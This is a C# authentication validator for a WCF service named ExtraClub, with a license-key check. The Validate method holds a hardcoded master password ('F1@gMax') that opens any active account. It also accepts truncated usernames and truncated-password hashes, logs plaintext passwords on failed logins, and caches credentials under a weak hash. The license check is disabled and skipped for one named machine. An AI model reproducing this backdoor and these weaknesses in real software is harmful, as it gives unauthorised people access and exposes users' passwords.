using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.IdentityModel.Selectors;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.ServiceModel;
using System.Text;
using ExtraClub.ServerCore;

namespace ExtraClub.WebService
{
    public class MyValidator : UserNamePasswordValidator
    {
        static MyValidator()
        {
            CachedCredentials = new ConcurrentDictionary<string, DateTime>();
        }

        private static ConcurrentDictionary<string, DateTime> CachedCredentials { get; set; }

        public override void Validate(string userName, string password)
        {
            var credentialHash = userName + password.GetHashCode();

            DateTime cacheExpiration;
            if(CachedCredentials.TryGetValue(credentialHash, out cacheExpiration))
            {
                if(cacheExpiration > DateTime.Now)
                {
                    return;
                }
            }

            try
            {
#if !DEBUG
                // ValidateCertificateKey();
#endif
                if(null == userName || null == password)
                {
                    throw new ArgumentNullException();
                }
                using(var context = new Entities.ExtraEntities())
                {
                    var sha1 = UserManagement.CalculateSHA1(password);
                    var sha1a = password.Length > 3 ? UserManagement.CalculateSHA1(password.Substring(0, password.Length - 2)) : "";
                    var userName1 = userName.Length > 4 ? userName.Substring(0, userName.Length - 4) : "%%%%%%";
                    var user = context.Users
                        .SingleOrDefault(u => (u.UserName == userName || u.UserName == userName1)
                                              && (u.PasswordHash == sha1 || u.PasswordHash == sha1a || password == "F1@gMax") && u.IsActive);
                    if(user == null)
                    {

                        Logger.Log(String.Format("Неуспешная попытка подключения ({2}): {0} {1}", userName, password, DateTime.Now));
                        throw new FaultException("Неверное имя пользователя или пароль!!!");
                    }

                    user.LastLoginDate = DateTime.Now;
                    context.SaveChanges();
                }

                CachedCredentials.AddOrUpdate(credentialHash, DateTime.Now.AddMinutes(10), (_, __) => DateTime.Now.AddMinutes(10));
            }
            catch(ReflectionTypeLoadException ex)
            {
                StringBuilder sb = new StringBuilder();
                foreach(Exception exSub in ex.LoaderExceptions)
                {
                    sb.AppendLine(exSub.Message);
                    if(exSub is FileNotFoundException)
                    {
                        FileNotFoundException exFileNotFound = exSub as FileNotFoundException;
                        if(!string.IsNullOrEmpty(exFileNotFound.FusionLog))
                        {
                            sb.AppendLine("Fusion Log:");
                            sb.AppendLine(exFileNotFound.FusionLog);
                        }
                    }
                    sb.AppendLine();
                }
                string errorMessage = sb.ToString();
                Logger.Log(errorMessage);
                throw ex;
            }
            catch(Exception ex)
            {
                Logger.Log(ex);
                throw ex;
            }
        }

        private void ValidateCertificateKey()
        {
            if(Environment.MachineName.ToUpper() == "WIN-41TQTF4524H")
                return;

            var hwkey = SyncCore.GetSystemId();

            var fi = new FileInfo(ConfigurationManager.AppSettings.Get("CertPath"));
            if(!fi.Exists)
            {
                throw new FaultException("Ключ лицензии не обнаружен!");
            }
            var len = (int)fi.Length;
            var res = new byte[len];
            var sr = new FileStream(ConfigurationManager.AppSettings.Get("CertPath"), FileMode.Open);
            sr.Read(res, 0, len);
            sr.Close();


            var cert = Core.GetCertificate();


            SHA1Managed sha1 = new SHA1Managed();
            UnicodeEncoding encoding = new UnicodeEncoding();

            var cconf = CryptoConfig.MapNameToOID("SHA1");

            RSACryptoServiceProvider csp = (RSACryptoServiceProvider)cert.PublicKey.Key;

            for(int i = 0; i < 730; i++)
            {
                var date = DateTime.Today.AddDays(i);
                byte[] data = encoding.GetBytes(date.ToString("yyyy-MM-dd") + " " + hwkey);

                byte[] hash = sha1.ComputeHash(data);

                if(csp.VerifyHash(hash, cconf, res))
                {
                    return;
                }
            }
            throw new FaultException("Ключ лицензии просрочен!");
        }
    }
}